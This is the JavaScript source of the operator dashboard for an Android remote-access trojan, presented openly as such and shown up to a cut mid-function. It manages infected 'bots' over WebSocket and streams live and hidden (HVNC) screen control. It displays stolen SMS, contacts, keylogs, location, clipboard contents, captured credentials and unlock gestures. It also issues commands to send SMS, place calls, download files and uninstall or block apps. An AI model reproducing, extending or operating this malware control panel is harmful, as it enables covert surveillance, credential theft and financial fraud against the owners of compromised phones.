/**
 * RAT Dashboard — operator frontend
 * Connects to /operator WebSocket endpoint.
 * Binary protocol: [magic:1][idLen:2BE][deviceId:N][jpegData]
 *   VNC_MAGIC  = 0xFE
 *   HVNC_MAGIC = 0xFF
 */
'use strict';

const App = (() => {
  // ─────────────────────────── Constants ────────────────────────────
  const VNC_MAGIC  = 0xFE;
  const HVNC_MAGIC = 0xFF;

  const WS_URL = (() => {
    const loc = window.location;
    const proto = loc.protocol === 'https:' ? 'wss:' : 'ws:';
    return `${proto}//${loc.host}/operator`;
  })();

  const RECONNECT_DELAYS = [0, 500, 1000, 2000, 4000, 8000, 15000];

  // ─────────────────────────── State ────────────────────────────────
  let ws = null;
  let wsReady = false;
  let reconnectIdx = 0;
  let reconnectTimer = null;

  let selectedDeviceId = null;
  const deviceMap = new Map(); // deviceId → device object

  // VNC state
  let vncActive = false;
  let vncImgBitmap = null;
  let vncRafId = null;
  let vncFrameCount = 0;
  let vncFpsTs = Date.now();
  let vncDragging = false;
  let vncDragStart = null;

  // HVNC state
  let hvncActive = false;
  let hvncRafId = null;
  let hvncFrameCount = 0;
  let hvncFpsTs = Date.now();
  let hvncDragging = false;
  let hvncDragStart = null;

  // Cache per device
  const deviceCache = {}; // deviceId → { sms, contacts, files, keylogs, apps, logs, location }
  function getCache(id) {
    if (!deviceCache[id]) {
      deviceCache[id] = {
        sms: [], contacts: [], files: [], keylogs: [],
        apps: [], logs: [], location: null,
        clipRules: [], clipActive: false,
      };
    }
    return deviceCache[id];
  }

  // ─────────────────────────── DOM refs ────────────────────────────
  const $ = id => document.getElementById(id);
  const $el = (sel, ctx = document) => ctx.querySelector(sel);
  const $all = (sel, ctx = document) => [...ctx.querySelectorAll(sel)];

  // ─────────────────────────── WebSocket ───────────────────────────
  function connect() {
    if (ws) { try { ws.close(); } catch (_) {} }
    setConnState('connecting');

    ws = new WebSocket(WS_URL);
    ws.binaryType = 'arraybuffer';

    ws.onopen = () => {
      wsReady = true;
      reconnectIdx = 0;
      clearTimeout(reconnectTimer);
      setConnState('connected');
      send({ type: 'GET_BOTS' });
    };

    ws.onclose = () => {
      wsReady = false;
      setConnState('disconnected');
      scheduleReconnect();
    };

    ws.onerror = () => {
      wsReady = false;
      setConnState('error');
    };

    ws.onmessage = evt => {
      if (evt.data instanceof ArrayBuffer) {
        handleBinary(evt.data);
      } else {
        handleJson(evt.data);
      }
    };
  }

  function scheduleReconnect() {
    if (reconnectTimer) return;
    const delay = RECONNECT_DELAYS[Math.min(reconnectIdx, RECONNECT_DELAYS.length - 1)];
    reconnectIdx++;
    reconnectTimer = setTimeout(() => {
      reconnectTimer = null;
      connect();
    }, delay);
  }

  function send(obj) {
    if (!wsReady) return false;
    ws.send(JSON.stringify(obj));
    return true;
  }

  function sendBin(buf) {
    if (!wsReady) return;
    ws.send(buf);
  }

  // ─────────────────────────── Binary handler ──────────────────────
  function handleBinary(buf) {
    const view = new DataView(buf);
    if (buf.byteLength < 3) return;

    const magic = view.getUint8(0);
    const idLen  = view.getUint16(1, false); // big-endian
    if (buf.byteLength < 3 + idLen) return;

    const idBytes = new Uint8Array(buf, 3, idLen);
    const deviceId = new TextDecoder().decode(idBytes);
    const frameData = buf.slice(3 + idLen);

    if (magic === VNC_MAGIC) {
      if (selectedDeviceId === deviceId && vncActive) {
        renderJpegFrame(frameData, 'vnc-canvas', 'vnc-overlay', frame => { vncImgBitmap = frame; });
        vncFrameCount++;
        updateFps('vnc');
      }
    } else if (magic === HVNC_MAGIC) {
      if (selectedDeviceId === deviceId && hvncActive) {
        renderJpegFrame(frameData, 'hvnc-canvas', 'hvnc-overlay', null);
        hvncFrameCount++;
        updateFps('hvnc');
      }
    }
  }

  // Draw JPEG blob onto canvas
  function renderJpegFrame(jpegBuf, canvasId, overlayId, storeFn) {
    const blob = new Blob([jpegBuf], { type: 'image/jpeg' });
    const url  = URL.createObjectURL(blob);
    const img  = new Image();
    img.onload = () => {
      const canvas = $(canvasId);
      const overlay = $(overlayId);
      if (!canvas) { URL.revokeObjectURL(url); return; }

      // Fit to container keeping aspect ratio
      const wrap = canvas.parentElement;
      const maxW = wrap.clientWidth;
      const maxH = wrap.clientHeight;
      const scale = Math.min(maxW / img.naturalWidth, maxH / img.naturalHeight, 1);
      const w = Math.round(img.naturalWidth  * scale);
      const h = Math.round(img.naturalHeight * scale);

      canvas.width  = img.naturalWidth;
      canvas.height = img.naturalHeight;
      canvas.style.width  = w + 'px';
      canvas.style.height = h + 'px';

      const ctx = canvas.getContext('2d');
      ctx.drawImage(img, 0, 0);
      if (overlay) overlay.style.display = 'none';
      if (storeFn) storeFn(img);
      URL.revokeObjectURL(url);
    };
    img.onerror = () => URL.revokeObjectURL(url);
    img.src = url;
  }

  function updateFps(type) {
    const now = Date.now();
    if (type === 'vnc') {
      const elapsed = (now - vncFpsTs) / 1000;
      if (elapsed >= 1) {
        $('vnc-fps').textContent = Math.round(vncFrameCount / elapsed) + ' fps';
        vncFrameCount = 0;
        vncFpsTs = now;
      }
    } else {
      const elapsed = (now - hvncFpsTs) / 1000;
      if (elapsed >= 1) {
        $('hvnc-fps').textContent = Math.round(hvncFrameCount / elapsed) + ' fps';
        hvncFrameCount = 0;
        hvncFpsTs = now;
      }
    }
  }

  // ─────────────────────────── JSON handler ────────────────────────
  function handleJson(raw) {
    let msg;
    try { msg = JSON.parse(raw); } catch (_) { return; }

    switch (msg.type) {
      case 'BOT_LIST':      handleBotList(msg.bots);                           break;
      case 'BOT_CONNECTED': handleBotConnected(msg.info || { device_id: msg.device_id }); break;
      case 'BOT_DISCONNECTED': handleBotDisconnected(msg.device_id);           break;
      case 'BOT_DATA':      handleBotData(msg.device_id, msg.data_type, msg.data); break;
      case 'COMMAND_RESULT': handleCommandResult(msg);                         break;
      case 'ERROR':         toast(msg.message || 'Server error', 'danger');    break;
    }
  }

  // ─────────────────────────── Bot management ──────────────────────
  function handleBotList(bots) {
    deviceMap.clear();
    bots.forEach(b => deviceMap.set(b.device_id, b));
    renderBotList();
    updateStats();
    if (selectedDeviceId && !deviceMap.has(selectedDeviceId)) {
      selectedDeviceId = null;
      showNoBot();
    }
  }

  function handleBotConnected(device) {
    deviceMap.set(device.device_id, device);
    renderBotList();
    updateStats();
    toast(`Device connected: ${device.device_id}`, 'success');
    pushActivity(device.device_id, 'Connected');
  }

  function handleBotDisconnected(deviceId) {
    const dev = deviceMap.get(deviceId);
    if (dev) { dev.online = false; dev.status = 'offline'; }
    renderBotList();
    updateStats();
    pushActivity(deviceId, 'Disconnected');
    if (selectedDeviceId === deviceId) {
      $('dh-badges').innerHTML = '<span class="badge badge-offline">OFFLINE</span>';
    }
  }

  function handleBotData(deviceId, dataType, data) {
    const cache = getCache(deviceId);

    switch (dataType) {
      case 'DEVICE_INFO':
        deviceMap.set(deviceId, { ...(deviceMap.get(deviceId) || {}), ...data, device_id: deviceId });
        renderBotList();
        updateStats();
        if (selectedDeviceId === deviceId) populateOverview(deviceId);
        pushActivity(deviceId, 'Device info updated');
        break;

      case 'SMS_LIST':
      case 'SMS_DATA':
        cache.sms = Array.isArray(data) ? data : (data.messages || []);
        if (selectedDeviceId === deviceId) renderSms(cache.sms);
        pushActivity(deviceId, `SMS: ${cache.sms.length} messages`);
        break;

      case 'CONTACTS_LIST':
      case 'CONTACTS_DATA':
        cache.contacts = Array.isArray(data) ? data : (data.contacts || []);
        if (selectedDeviceId === deviceId) renderContacts(cache.contacts);
        pushActivity(deviceId, `Contacts: ${cache.contacts.length}`);
        break;

      case 'FILE_LIST':
      case 'FILE_DATA':
        if (selectedDeviceId === deviceId) renderFiles(data);
        pushActivity(deviceId, `Files received`);
        break;

      case 'KEYLOG':
      case 'KEYLOG_DATA': {
        const entries = Array.isArray(data) ? data : [data];
        cache.keylogs = [...(cache.keylogs || []), ...entries];
        if (selectedDeviceId === deviceId) renderKeylogs(cache.keylogs);
        pushActivity(deviceId, `Keylog: ${entries.length} events`);
        break;
      }

      case 'INSTALLED_APPS':
      case 'APP_LIST':
        cache.apps = Array.isArray(data) ? data : (data.apps || []);
        if (selectedDeviceId === deviceId) renderApps(cache.apps, '');
        pushActivity(deviceId, `Apps: ${cache.apps.length}`);
        break;

      case 'LOCATION':
      case 'LOCATION_DATA':
        cache.location = data;
        if (selectedDeviceId === deviceId) {
          updateLocationDisplay(data);
          $('ov-loc').textContent = `${(data.latitude||0).toFixed(5)}, ${(data.longitude||0).toFixed(5)}`;
          $('ov-loc-acc').textContent = data.accuracy ? `±${data.accuracy}m` : '—';
          $('ov-loc-prov').textContent = data.provider || '—';
        }
        pushActivity(deviceId, `Location: ${data.latitude?.toFixed(4)},${data.longitude?.toFixed(4)}`);
        break;

      case 'SCREENSHOT': {
        // data is base64 jpeg or url
        toast('Screenshot received', 'success');
        break;
      }

      case 'CLIPBOARD_DATA':
        pushClipboardLog(data);
        break;

      case 'UNLOCK_SEQUENCE': {
        // Bot sends the recorded gesture sequence — store in cache and display
        const seqStr = typeof data === 'string' ? data : JSON.stringify(data);
        cache.unlockSequence = seqStr;
        if (selectedDeviceId === deviceId) renderUnlockSequence(seqStr);
        toast('Unlock sequence received', 'success');
        pushActivity(deviceId, 'Unlock sequence recorded');
        break;
      }

      case 'CREDENTIAL_CAPTURED': {
        // data is the full CREDENTIAL_CAPTURED message (kind, value, pkg, context, confidence, ts)
        const cred = data || {};
        if (!cache.credentials) cache.credentials = [];
        cache.credentials.unshift(cred);
        if (selectedDeviceId === deviceId) renderCredential(cred);
        toast(`Credential captured: ${cred.kind || '?'} = ${cred.value || '?'}`, 'success');
        pushActivity(deviceId, `Credential[${cred.kind || '?'}]: ${cred.value || '?'} (${Math.round((cred.confidence || 0) * 100)}%)`);
        break;
      }

      default:
        // General log
        cache.logs = cache.logs || [];
        cache.logs.unshift({ time: Date.now(), type: dataType, data });
        if (selectedDeviceId === deviceId) prependActivityLog(dataType, data);
        break;
    }
  }

  function handleCommandResult(msg) {
    const text = msg.result || msg.message || JSON.stringify(msg);
    toast(`Result: ${String(text).substring(0, 120)}`, 'success');
    pushActivity(msg.device_id || selectedDeviceId, `Result[${msg.command || '?'}]: ${String(text).substring(0, 80)}`);
  }

  // ─────────────────────────── Bot list UI ────────────────────────
  function renderBotList() {
    const container = $('bot-list');
    const current = selectedDeviceId;
    container.innerHTML = '';

    if (deviceMap.size === 0) {
      container.innerHTML = '<div class="empty-state" style="padding:20px;">No devices</div>';
      return;
    }

    // Sort: online first, then by last_seen
    const sorted = [...deviceMap.values()].sort((a, b) => {
      if (a.online !== b.online) return a.online ? -1 : 1;
      return (b.last_seen || 0) - (a.last_seen || 0);
    });

    sorted.forEach(dev => {
      const el = document.createElement('div');
      el.className = 'bot-item' + (dev.device_id === current ? ' selected' : '');
      el.dataset.id = dev.device_id;

      const isOnline = dev.online || dev.status === 'online';
      el.innerHTML = `
        <span class="status-dot ${isOnline ? 'online' : 'offline'}"></span>
        <div class="bot-item-info">
          <div class="bot-item-id">${escHtml(dev.model || dev.device_id)}</div>
          <div class="bot-item-sub">${escHtml(dev.android_version ? 'Android ' + dev.android_version : dev.device_id)}</div>
        </div>`;
      el.addEventListener('click', () => selectDevice(dev.device_id));
      container.appendChild(el);
    });

    $('bot-count').textContent = deviceMap.size;
  }

  function updateStats() {
    const online = [...deviceMap.values()].filter(d => d.online || d.status === 'online').length;
    $('stat-online-count').textContent = online;
    $('stat-total-count').textContent = deviceMap.size;
  }

  // ─────────────────────────── Device selection ────────────────────
  function selectDevice(deviceId) {
    selectedDeviceId = deviceId;

    // Update bot list selection
    $all('.bot-item').forEach(el => {
      el.classList.toggle('selected', el.dataset.id === deviceId);
    });

    // Show bot panel
    $('no-bot').style.display = 'none';
    $('bot-panel').style.display = 'flex';

    populateOverview(deviceId);

    // Load cached data
    const cache = getCache(deviceId);
    renderSms(cache.sms);
    renderContacts(cache.contacts);
    renderKeylogs(cache.keylogs);
    renderApps(cache.apps, '');

    // Restore unlock/credential state
    const credContainer = $('credentials-list');
    if (credContainer) {
      credContainer.innerHTML = '<div class="empty-state">No credentials captured yet</div>';
      (cache.credentials || []).forEach(c => renderCredential(c));
    }
    const seqDisplay = $('unlock-seq-display');
    if (seqDisplay) seqDisplay.textContent = cache.unlockSequence || '';
    const seqInput = $('unlock-seq-input');
    if (seqInput) seqInput.value = cache.unlockSequence || '';
    renderFiles(null);

    // Ask server for fresh data
    send({ type: 'GET_LOGS',     device_id: deviceId, limit: 50 });
    send({ type: 'GET_KEYLOGS',  device_id: deviceId, limit: 200 });
    send({ type: 'GET_SMS_CACHE',      device_id: deviceId });
    send({ type: 'GET_CONTACTS_CACHE', device_id: deviceId });
    send({ type: 'GET_APPS_CACHE',     device_id: deviceId });
    send({ type: 'GET_LOCATION_CACHE', device_id: deviceId });

    // Activate overview tab
    activateTab('overview');
  }

  function showNoBot() {
    $('no-bot').style.display = '';
    $('bot-panel').style.display = 'none';
  }

  function populateOverview(deviceId) {
    const dev = deviceMap.get(deviceId) || {};
    const isOnline = dev.online || dev.status === 'online';

    $('dh-id').textContent    = deviceId;
    $('dh-model').textContent = dev.model || dev.manufacturer || '—';
    $('dh-badges').innerHTML  = `
      <span class="badge ${isOnline ? 'badge-online' : 'badge-offline'}">${isOnline ? 'ONLINE' : 'OFFLINE'}</span>
      ${dev.admin ? '<span class="badge badge-danger">ADMIN</span>' : ''}
      ${dev.accessibility ? '<span class="badge badge-accent">A11Y</span>' : ''}
    `;

    $('ov-id').textContent      = deviceId;
    $('ov-model').textContent   = dev.model       || '—';
    $('ov-mfr').textContent     = dev.manufacturer || '—';
    $('ov-android').textContent = dev.android_version ? 'Android ' + dev.android_version : '—';
    $('ov-sdk').textContent     = dev.sdk_version  || '—';
    $('ov-net').textContent     = dev.network_type || '—';
    $('ov-sim').textContent     = dev.sim_operator  || dev.phone_number || '—';
    $('ov-bat').textContent     = dev.battery_level != null ? dev.battery_level + '%' : '—';
    $('ov-admin').textContent   = dev.admin ? '✓ Yes' : '✗ No';
    $('ov-acc').textContent     = dev.accessibility ? '✓ Yes' : '✗ No';
    $('ov-conn').innerHTML      = `<span class="${isOnline ? 'text-success' : 'text-danger'}">${isOnline ? 'Online' : 'Offline'}</span>`;

    $('ov-first').textContent = dev.first_seen ? new Date(dev.first_seen).toLocaleString() : '—';
    $('ov-last').textContent  = dev.last_seen  ? new Date(dev.last_seen).toLocaleString()  : '—';

    const cache = getCache(deviceId);
    if (cache.location) {
      $('ov-loc').textContent      = `${(cache.location.latitude||0).toFixed(5)}, ${(cache.location.longitude||0).toFixed(5)}`;
      $('ov-loc-acc').textContent  = cache.location.accuracy ? `±${cache.location.accuracy}m` : '—';
      $('ov-loc-prov').textContent = cache.location.provider || '—';
    }

    // Accounts
    const accEl = $('ov-accounts');
    const accounts = tryParse(dev.accounts, []);
    if (accounts.length) {
      accEl.innerHTML = accounts.map(a =>
        `<span class="perm-chip">${escHtml(a.type||'?')}: ${escHtml(a.name||a)}</span>`
      ).join('');
    } else {
      accEl.innerHTML = '<span class="text-muted">—</span>';
    }

    // Permissions
    const permEl = $('ov-perms');
    const perms = tryParse(dev.permissions, []);
    if (perms.length) {
      permEl.innerHTML = perms.map(p => {
        const name = String(p).split('.').pop();
        return `<span class="perm-chip granted">${escHtml(name)}</span>`;
      }).join('');
    } else {
      permEl.innerHTML = '<span class="text-muted">—</span>';
    }
  }

  function updateLocationDisplay(loc) {
    $('ov-loc').textContent      = `${(loc.latitude||0).toFixed(5)}, ${(loc.longitude||0).toFixed(5)}`;
    $('ov-loc-acc').textContent  = loc.accuracy ? `±${loc.accuracy}m` : '—';
    $('ov-loc-prov').textContent = loc.provider || '—';
  }

  // ─────────────────────────── Tab system ──────────────────────────
  function activateTab(name) {
    $all('.tab-btn').forEach(btn => {
      btn.classList.toggle('active', btn.dataset.tab === name);
    });
    $all('.tab-pane').forEach(pane => {
      const paneId = pane.id.replace('tab-', '');
      pane.classList.toggle('active', paneId === name);
    });

    // Stop streams when navigating away
    if (name !== 'vnc'  && vncActive)  stopVnc();
    if (name !== 'hvnc' && hvncActive) stopHvnc();
  }

  // ─────────────────────────── VNC ─────────────────────────────────
  function startVnc() {
    if (!selectedDeviceId) return;
    vncActive = true;
    $('vnc-start-btn').style.display = 'none';
    $('vnc-stop-btn').style.display  = '';
    $('vnc-overlay').style.display   = 'flex';
    $('vnc-overlay').textContent     = 'Waiting for frames…';

    const quality = parseInt($('vnc-quality').value, 10);
    send({ type: 'SUBSCRIBE_VNC', device_id: selectedDeviceId });
    cmd('START_VNC', { quality });
  }

  function stopVnc() {
    vncActive = false;
    $('vnc-start-btn').style.display = '';
    $('vnc-stop-btn').style.display  = 'none';
    $('vnc-overlay').style.display   = 'flex';
    $('vnc-overlay').textContent     = 'Screen stopped';
    $('vnc-fps').textContent         = '— fps';

    send({ type: 'UNSUBSCRIBE_VNC', device_id: selectedDeviceId });
    cmd('STOP_VNC');
  }

  function startHvnc() {
    if (!selectedDeviceId) return;
    hvncActive = true;
    $('hvnc-start-btn').style.display = 'none';
    $('hvnc-stop-btn').style.display  = '';
    $('hvnc-overlay').style.display   = 'flex';
    $('hvnc-overlay').textContent     = 'Waiting for HVNC frames…';

    send({ type: 'SUBSCRIBE_HVNC', device_id: selectedDeviceId });
    cmd('START_HVNC');
  }

  function stopHvnc() {
    hvncActive = false;
    $('hvnc-start-btn').style.display = '';
    $('hvnc-stop-btn').style.display  = 'none';
    $('hvnc-overlay').style.display   = 'flex';
    $('hvnc-overlay').textContent     = 'HVNC stopped';
    $('hvnc-fps').textContent         = '— fps';

    send({ type: 'UNSUBSCRIBE_HVNC', device_id: selectedDeviceId });
    cmd('STOP_HVNC');
  }

  function vncQualityChange() {
    if (vncActive) {
      const quality = parseInt($('vnc-quality').value, 10);
      cmd('VNC_QUALITY', { quality });
    }
  }

  // Canvas → device coordinate transform
  function canvasCoords(canvas, clientX, clientY) {
    const rect = canvas.getBoundingClientRect();
    const scaleX = canvas.width  / rect.width;
    const scaleY = canvas.height / rect.height;
    return {
      x: Math.round((clientX - rect.left) * scaleX),
      y: Math.round((clientY - rect.top)  * scaleY),
    };
  }

  // VNC canvas interaction
  function setupVncCanvas() {
    const canvas = $('vnc-canvas');

    canvas.addEventListener('mousedown', e => {
      if (!vncActive) return;
      e.preventDefault();
      const { x, y } = canvasCoords(canvas, e.clientX, e.clientY);
      vncDragging = true;
      vncDragStart = { x, y, t: Date.now() };
    });

    canvas.addEventListener('mouseup', e => {
      if (!vncActive || !vncDragging) return;
      e.preventDefault();
      const { x, y } = canvasCoords(canvas, e.clientX, e.clientY);
      const dx = Math.abs(x - vncDragStart.x);
      const dy = Math.abs(y - vncDragStart.y);
      const dt = Date.now() - vncDragStart.t;
      vncDragging = false;

      if (e.button === 2) {
        // Right click → LONG_PRESS
        cmd('LONG_PRESS', { x, y });
      } else if (dx > 10 || dy > 10) {
        // Drag → SWIPE
        cmd('SWIPE', { x1: vncDragStart.x, y1: vncDragStart.y, x2: x, y2: y, duration: dt });
      } else {
        // Click → TAP
        cmd('TAP', { x, y });
      }
    });

    canvas.addEventListener('contextmenu', e => { e.preventDefault(); });

    canvas.addEventListener('mousemove', e => {
      if (!vncActive || !vncDragging) return;
      e.preventDefault();
    });

    // Touch support
    canvas.addEventListener('touchstart', e => {
      if (!vncActive) return;
      e.preventDefault();
      const t = e.touches[0];
      const { x, y } = canvasCoords(canvas, t.clientX, t.clientY);
      vncDragging = true;
      vncDragStart = { x, y, t: Date.now() };
    }, { passive: false });

    canvas.addEventListener('touchend', e => {
      if (!vncActive || !vncDragging) return;
      e.preventDefault();
      const t = e.changedTouches[0];
      const { x, y } = canvasCoords(canvas, t.clientX, t.clientY);
      const dx = Math.abs(x - vncDragStart.x);
      const dy = Math.abs(y - vncDragStart.y);
      const dt = Date.now() - vncDragStart.t;
      vncDragging = false;

      if (dx > 15 || dy > 15) {
        cmd('SWIPE', { x1: vncDragStart.x, y1: vncDragStart.y, x2: x, y2: y, duration: dt });
      } else if (dt > 600) {
        cmd('LONG_PRESS', { x, y });
      } else {
        cmd('TAP', { x, y });
      }
    }, { passive: false });
  }

  // HVNC canvas interaction
  function setupHvncCanvas() {
    const canvas = $('hvnc-canvas');

    canvas.addEventListener('mousedown', e => {
      if (!hvncActive) return;
      e.preventDefault();
      const { x, y } = canvasCoords(canvas, e.clientX, e.clientY);
      hvncDragging = true;
      hvncDragStart = { x, y, t: Date.now() };
    });

    canvas.addEventListener('mouseup', e => {
      if (!hvncActive || !hvncDragging) return;
      e.preventDefault();
      const { x, y } = canvasCoords(canvas, e.clientX, e.clientY);
      const dx = Math.abs(x - hvncDragStart.x);
      const dy = Math.abs(y - hvncDragStart.y);
      const dt = Date.now() - hvncDragStart.t;
      hvncDragging = false;

      if (e.button === 2) {
        hvncCmd_send('LONG_PRESS', { x, y });
      } else if (dx > 10 || dy > 10) {
        hvncCmd_send('SWIPE', { x1: hvncDragStart.x, y1: hvncDragStart.y, x2: x, y2: y, duration: dt });
      } else {
        hvncCmd_send('TAP', { x, y });
      }
    });

    canvas.addEventListener('contextmenu', e => e.preventDefault());
  }

  function vncSendText() {
    const input = $('vnc-type-input');
    const text  = input.value.trim();
    if (!text) return;
    cmd('TYPE', { text });
    input.value = '';
  }

  function hvncSendText() {
    const input = $('hvnc-type-input');
    const text  = input.value.trim();
    if (!text) return;
    hvncCmd_send('TYPE', { text });
    input.value = '';
  }

  function hvncCmd_send(action, params = {}) {
    if (!selectedDeviceId) return;
    send({ type: 'HVNC_COMMAND', device_id: selectedDeviceId, action, ...params });
  }

  // Public hvncCmd shorthand
  function hvncCmd(action, params = {}) {
    hvncCmd_send(action, params);
  }

  // ─────────────────────────── Files ──────────────────────────────
  let currentFilePath = '/';

  function fileBrowse() {
    const pathInput = $('file-path-input');
    const path = pathInput.value || '/';
    currentFilePath = path;
    cmd('LIST_FILES', { path });
  }

  function fileNavUp() {
    const parts = currentFilePath.split('/').filter(Boolean);
    if (parts.length === 0) return;
    parts.pop();
    const parent = '/' + parts.join('/');
    $('file-path-input').value = parent || '/';
    fileBrowse();
  }

  function fileRefresh() { fileBrowse(); }

  function renderFiles(data) {
    const container = $('file-list');
    if (!data) {
      container.innerHTML = '<div class="empty-state">Browse to a directory</div>';
      return;
    }

    const files = Array.isArray(data) ? data : (data.files || data.list || []);
    if (!files.length) {
      container.innerHTML = '<div class="empty-state">Empty directory</div>';
      return;
    }

    container.innerHTML = files.map(f => {
      const isDir = f.isDirectory || f.type === 'dir' || f.is_dir;
      const size  = f.size != null ? formatBytes(f.size) : '';
      return `<div class="file-item ${isDir ? 'dir' : 'file'}" data-path="${escAttr(f.path || f.name)}">
        <span class="file-icon">${isDir ? '📁' : '📄'}</span>
        <span class="file-name">${escHtml(f.name)}</span>
        <span class="file-size">${size}</span>
        ${!isDir ? `<button class="btn btn-sm file-dl-btn" onclick="App.downloadFromDevice('${escAttr(f.path||f.name)}')">⬇</button>` : ''}
      </div>`;
    }).join('');

    // Click directories to navigate
    $all('.file-item.dir', container).forEach(el => {
      el.addEventListener('click', () => {
        const path = el.dataset.path;
        $('file-path-input').value = path;
        cmd('LIST_FILES', { path });
      });
    });
  }

  function downloadFromDevice(path) {
    cmd('DOWNLOAD_FILE', { path });
    toast(`Downloading: ${path}`, 'accent');
  }

  // ─────────────────────────── SMS ────────────────────────────────
  function renderSms(messages) {
    const container = $('sms-list');
    if (!messages || !messages.length) {
      container.innerHTML = '<div class="empty-state" style="padding:20px;">No messages</div>';
      return;
    }
    container.innerHTML = messages.map(m => {
      const dir = m.type === 1 || m.type === 'INBOX' ? 'in' : 'out';
      const time = m.date ? new Date(parseInt(m.date)).toLocaleString() : '';
      return `<div class="sms-item">
        <div class="sms-meta">
          <span class="sms-number">${escHtml(m.address || m.number || '?')}</span>
          <span class="sms-dir ${dir}">${dir === 'in' ? '↙ IN' : '↗ OUT'}</span>
          <span class="sms-time">${time}</span>
        </div>
        <div class="sms-body">${escHtml(m.body || m.message || '')}</div>
      </div>`;
    }).join('');
  }

  function smsSearch(q) {
    const cache = getCache(selectedDeviceId);
    if (!q) { renderSms(cache.sms); return; }
    const lq = q.toLowerCase();
    renderSms(cache.sms.filter(m =>
      (m.body || m.message || '').toLowerCase().includes(lq) ||
      (m.address || m.number || '').toLowerCase().includes(lq)
    ));
  }

  // ─────────────────────────── Contacts ───────────────────────────
  function renderContacts(contacts) {
    const container = $('contacts-list');
    if (!contacts || !contacts.length) {
      container.innerHTML = '<div class="empty-state" style="padding:20px;">No contacts</div>';
      return;
    }
    container.innerHTML = contacts.map(c => {
      const nums = Array.isArray(c.numbers) ? c.numbers.join(', ') : (c.phone || c.number || '—');
      return `<div class="contact-item">
        <div class="contact-avatar">${(c.name||'?')[0].toUpperCase()}</div>
        <div class="contact-info">
          <div class="contact-name">${escHtml(c.name || '—')}</div>
          <div class="contact-num">${escHtml(nums)}</div>
        </div>
      </div>`;
    }).join('');
  }

  function contactsSearch(q) {
    const cache = getCache(selectedDeviceId);
    if (!q) { renderContacts(cache.contacts); return; }
    const lq = q.toLowerCase();
    renderContacts(cache.contacts.filter(c =>
      (c.name || '').toLowerCase().includes(lq) ||
      (Array.isArray(c.numbers) ? c.numbers.join('') : (c.phone||'')).includes(lq)
    ));
  }

  // ─────────────────────────── Keylogs ───────────────────────────
  function renderKeylogs(entries) {
    const viewer = $('keylog-viewer');
    if (!entries || !entries.length) {
      viewer.innerHTML = '<div class="keylog-empty">No keylog data</div>';
      return;
    }
    viewer.innerHTML = entries.map(e => {
      const time = e.timestamp || e.time ? new Date(e.timestamp || e.time).toLocaleString() : '';
      const app  = e.package || e.app || '';
      const text = e.text || e.key || e.data || JSON.stringify(e);
      return `<div class="keylog-entry">
        <span class="kl-time">${time}</span>
        ${app ? `<span class="kl-app">${escHtml(app)}</span>` : ''}
        <span class="kl-text">${escHtml(text)}</span>
      </div>`;
    }).join('');
    viewer.scrollTop = viewer.scrollHeight;
  }

  function keylogRefresh() {
    if (!selectedDeviceId) return;
    send({ type: 'GET_KEYLOGS', device_id: selectedDeviceId, limit: 500 });
  }

  function keylogClear() {
    if (!selectedDeviceId) return;
    send({ type: 'CLEAR_KEYLOGS', device_id: selectedDeviceId });
    getCache(selectedDeviceId).keylogs = [];
    renderKeylogs([]);
    toast('Keylogs cleared', 'success');
  }

  function keylogCopy() {
    const cache = getCache(selectedDeviceId);
    const text = (cache.keylogs || []).map(e =>
      `[${new Date(e.timestamp||e.time||0).toLocaleString()}] ${e.package||''}: ${e.text||e.key||''}`
    ).join('\n');
    navigator.clipboard.writeText(text).then(() => toast('Copied to clipboard', 'success'));
  }

  // ─────────────────────────── Apps ──────────────────────────────
  function renderApps(apps, filter) {
    const grid = $('app-grid');
    if (!apps || !apps.length) {
      grid.innerHTML = '<div class="empty-state" style="padding:20px;">No apps</div>';
      return;
    }
    const lq = (filter || '').toLowerCase();
    const filtered = lq
      ? apps.filter(a => (a.name || a.label || '').toLowerCase().includes(lq) || (a.package || a.packageName || '').toLowerCase().includes(lq))
      : apps;

    grid.innerHTML = filtered.map(a => {
      const name    = a.name || a.label || a.package || '?';
      const pkg     = a.package || a.packageName || '?';
      const version = a.version || a.versionName || '';
      return `<div class="app-card" title="${escAttr(pkg)}">
        <div class="app-icon">${escHtml(name[0]||'?')}</div>
        <div class="app-name">${escHtml(name)}</div>
        <div class="app-pkg">${escHtml(pkg)}</div>
        ${version ? `<div class="app-ver">${escHtml(version)}</div>` : ''}
        <div class="app-actions">
          <button class="btn btn-sm" onclick="event.stopPropagation(); App.cmd('OPEN_APP',{package:'${escAttr(pkg)}'})">Open</button>
          <button class="btn btn-danger btn-sm" onclick="event.stopPropagation(); App.uninstallAppPkg('${escAttr(pkg)}')">Del</button>
        </div>
      </div>`;
    }).join('');
  }

  function appsSearch(q) {
    const cache = getCache(selectedDeviceId);
    renderApps(cache.apps, q);
  }

  function uninstallAppPkg(pkg) {
    cmd('UNINSTALL_APP', { package: pkg });
    toast(`Uninstalling: ${pkg}`, 'warning');
  }

  // ─────────────────────────── Command dispatcher ─────────────────
  function cmd(action, params = {}) {
    if (!selectedDeviceId) { toast('No device selected', 'danger'); return; }
    send({ type: 'COMMAND', device_id: selectedDeviceId, action, ...params });
  }

  // ─────────────────────────── Controls handlers ──────────────────
  function sendSms() {
    const to   = $('sms-to').value.trim();
    const body = $('sms-body').value.trim();
    if (!to || !body) { toast('Enter number and message', 'warning'); return; }
    cmd('SEND_SMS', { phone: to, message: body });
    toast(`SMS sending to ${to}`, 'accent');
  }

  function makeCall() {
    const num = $('call-number').value.trim();
    if (!num) { toast('Enter phone number', 'warning'); return; }
    cmd('MAKE_CALL', { phone: num });
  }

  function openApp() {
    const pkg = $('pkg-input').value.trim();
    if (!pkg) return;
    cmd('OPEN_APP', { package: pkg });
  }

  function uninstallApp() {
    const pkg = $('pkg-input').value.trim();
    if (!pkg) return;
    cmd('UNINSTALL_APP', { package: pkg });
  }

  function forceStop() {
    const pkg = $('pkg-input').value.trim();
    if (!pkg) return;
    cmd('FORCE_STOP', { package: pkg });
  }

  function clearAppData() {
    const pkg = $('pkg-input').value.trim();
    if (!pkg) return;
    cmd('CLEAR_DATA', { package: pkg });
  }

  function blockPackage() {
    const pkg = $('block-pkg-input').value.trim();
    if (!pkg) return;
    cmd('BLOCK_APP', { package: pkg });
  }

  function unblockPackage() {
    const pkg = $('block-pkg-input').value.trim();
    if (!pkg) return;
    cmd('UNBLOCK_APP', { package: pkg });
  }

  function sendNotification() {
    const title = $('notif-title').value.trim();
    const body  = $('notif-body').value.trim();
    if (!title && !body) return;
    cmd('SHOW_NOTIFICATION', { title, body });
  }

  function sendToast() {
    const msg = $('toast-msg').value.trim();
